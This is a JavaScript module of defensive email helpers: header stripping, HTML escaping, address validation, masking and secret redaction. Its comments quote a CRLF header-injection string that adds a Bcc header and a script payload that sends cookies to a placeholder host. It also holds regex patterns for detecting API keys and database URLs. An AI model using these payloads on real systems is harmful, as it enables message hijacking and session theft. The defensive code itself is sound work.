/* Making untrusted values safe to put in an email.

   Every one of these functions exists because a customer controls the value it
   handles. Names, delivery notes and email addresses are typed by strangers
   and end up in headers and HTML, which are two different injection surfaces
   with two different fixes. No file in lib/mail composes a message without
   going through here first.

   This module is deliberately dependency-free and pure so the tests can hammer
   it without a network, a database or a provider. */

/* Two forms of each pattern, and the split matters.

   The /g versions are for .replace(), which needs the flag to reach every
   occurrence. The plain versions are for .test().

   A /g regex carries lastIndex between calls, so .test() on one is stateful:
   check a string whose break sits at index 20, then one whose break sits at
   index 1, and the second returns false because the search resumed past it.
   That is a validator that accepts a header injection because of what it was
   handed previously. Demonstrated before this comment was written.

   Both are built from escape strings rather than written as literals, so no
   raw control byte ever sits in this file to be mangled by an editor.

   CR and LF are the whole attack: a transport that sees a line break believes
   what follows is a header the application meant to send. */
const BREAKS = "\\r\\n\\t\\v\\f\\u0085\\u2028\\u2029";
const CTRL = "\\u0000-\\u001F\\u007F";

const HEADER_BREAKS_G = new RegExp(`[${BREAKS}]`, "g");
const HEADER_BREAKS = new RegExp(`[${BREAKS}]`);
const CONTROL_G = new RegExp(`[${CTRL}]`, "g");
const CONTROL = new RegExp(`[${CTRL}]`);

/* Header injection.

   Anything reaching a Subject, a From, a Reply-To or a To must not be able to
   introduce a new header. "Order 123\r\nBcc: everyone@example.com" is the
   whole trick: the transport sees a line break and believes the rest is a
   header the application meant to send.

   Resend takes structured JSON rather than a raw RFC 5322 message, so it is
   not as exposed as an SMTP transport would be — but the value still reaches a
   header eventually, this codebase used SMTP a week ago, and a defence that
   depends on the provider's parser is a defence that expires the next time the
   provider changes. Strip at the boundary. */
export function headerSafe(value, max = 200) {
  if (value == null) return "";
  return String(value)
    .replace(HEADER_BREAKS_G, " ")
    .replace(CONTROL_G, "")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, max);
}

/* HTML escaping.

   A delivery note reading "<script>fetch('//x/'+document.cookie)</script>"
   renders wherever the note is shown. Mail clients mostly refuse to run
   script, but "mostly" is not a security property, and the same string is
   about to be rendered in the admin panel too. */
const HTML = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };

export function escapeHtml(value) {
  if (value == null) return "";
  return String(value).replace(/[&<>"']/g, (c) => HTML[c]);
}

/** Escape, then turn newlines into <br> — for notes and addresses, which are
 *  multi-line by nature. Escaping first means the <br> we add is the only
 *  markup that survives. */
export function escapeHtmlLines(value) {
  return escapeHtml(value).replace(/\r?\n/g, "<br>");
}

/* Address validation.

   Deliberately conservative rather than RFC-complete: this decides whether we
   hand a string to a paid API and write it to a log, not whether a mailbox is
   theoretically legal. Anything with a line break or whitespace is refused
   outright — that is an injection attempt, not a typo. */
const ADDRESS = /^[^\s@<>",;:\\]+@[^\s@<>",;:\\]+\.[a-z]{2,}$/i;

export function validEmail(value) {
  if (typeof value !== "string") return false;
  const v = value.trim();
  if (v.length < 6 || v.length > 254) return false;
  if (HEADER_BREAKS.test(v) || CONTROL.test(v)) return false;
  return ADDRESS.test(v);
}

/** Normalised form used for logging, suppression checks and deduplication.
 *  Case-insensitive because mail domains are, and the local part is in
 *  practice too for every provider we would ever send to. */
export function normaliseEmail(value) {
  return String(value ?? "").trim().toLowerCase().slice(0, 254);
}

/* Redaction.

   Provider errors quote request context, and request context has held an API
   key more than once in the history of software. Anything that looks like a
   credential is replaced before the string reaches a log, a database row or an
   admin screen. */
const SECRETS = [
  /re_[A-Za-z0-9_-]{8,}/g,          // Resend API keys
  /whsec_[A-Za-z0-9+/=_-]{8,}/g,    // Svix signing secrets
  /Bearer\s+[A-Za-z0-9._-]{8,}/gi,
  /postgres(?:ql)?:\/\/[^\s"']+/gi,
];

export function redact(value, max = 400) {
  let s = String(value ?? "");
  for (const re of SECRETS) s = s.replace(re, "[redacted]");
  return s.slice(0, max);
}

/** Mask an address for display in a shared admin screen: enough to recognise
 *  which customer it is, not enough to harvest the list. */
export function maskEmail(value) {
  const v = normaliseEmail(value);
  const at = v.indexOf("@");
  if (at < 1) return "—";
  const local = v.slice(0, at);
  const domain = v.slice(at);
  const head = local.slice(0, Math.min(2, local.length));
  return `${head}${"•".repeat(Math.max(1, local.length - head.length))}${domain}`;
}
